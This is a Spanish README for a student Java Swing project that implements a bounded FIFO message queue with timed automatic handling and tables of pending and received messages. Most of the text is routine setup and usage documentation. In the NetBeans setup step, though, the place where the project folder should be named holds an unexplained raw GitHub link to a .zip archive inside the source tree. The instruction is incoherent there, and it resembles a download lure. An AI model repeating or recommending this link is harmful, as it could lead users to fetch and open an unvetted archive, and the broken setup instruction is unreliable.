# Taller de Colas - Cola de Mensajes

## Descripción

Este proyecto es una implementación de una cola de mensajes en Java utilizando una interfaz gráfica de usuario (GUI) construida con Swing. La aplicación permite encolar mensajes con un límite configurable, atenderlos manualmente o automáticamente después de un tiempo especificado, y visualizar los mensajes pendientes y recibidos en tablas.

## Características

- **Cola con límite**: La cola tiene un tamaño máximo configurable para evitar desbordamientos.
- **Mensajes con metadatos**: Cada mensaje incluye nombre del remitente, contenido del mensaje y fecha/hora de envío.
- **Atención automática**: Opción para configurar un temporizador que atienda mensajes automáticamente después de un número de segundos.
- **Interfaz gráfica**: GUI intuitiva para enviar mensajes, ver el primero y último mensaje, y monitorear las tablas de mensajes pendientes y recibidos.
- **Validación de entrada**: Verifica que los campos obligatorios estén llenos y maneja errores como cola llena o segundos inválidos.

## Requisitos

- **Java JDK**: Versión 8 o superior.
- **NetBeans IDE**: Recomendado para abrir y ejecutar el proyecto, ya que está configurado como un proyecto NetBeans.
- **Bibliotecas**: Utiliza bibliotecas estándar de Java (Swing, util, time).

## Cómo ejecutar

1. **Clonar o descargar el proyecto**: Asegúrate de tener todos los archivos en tu directorio de trabajo.
2. **Abrir en NetBeans**:
   - Abre NetBeans IDE.
   - Selecciona "File" > "Open Project" y navega hasta la carpeta del proyecto (donde está `https://raw.githubusercontent.com/cristiancrakl/Taller_Colas/main/src/Logica/Colas_Taller_v2.1.zip`).
   - Abre el proyecto.
3. **Compilar y ejecutar**:
   - Haz clic derecho en el proyecto en el panel de proyectos.
   - Selecciona "Run" o presiona F6.
   - La aplicación se ejecutará y mostrará la ventana principal de la GUI.

## Uso

1. **Enviar un mensaje**:

   - Ingresa el nombre en el campo "Nombre".
   - Escribe el mensaje en el área de texto.
   - Opcionalmente, ingresa los segundos para atención automática en "Segundos".
   - Haz clic en "Enviar". El mensaje se agregará a la cola si no está llena.

2. **Ver primero y último**:

   - Haz clic en "Primero Ultimo" para ver un diálogo con el primer y último mensaje en la cola.

3. **Atención automática**:

   - Si configuras segundos > 0, la aplicación atenderá automáticamente el primer mensaje después del tiempo especificado.

4. **Tablas**:
   - **Mensajes para atender**: Muestra los mensajes pendientes en la cola.
   - **Mensajes Recibido**: Muestra los mensajes ya atendidos con la fecha de recepción.

## Notas

- La cola se inicializa con un límite de 10 mensajes por defecto, pero puede ajustarse programáticamente.
- Los mensajes se procesan en orden FIFO (First In, First Out).
- La aplicación maneja errores como cola llena o entradas inválidas con mensajes de alerta.

## Autor

Cristiancrakl.
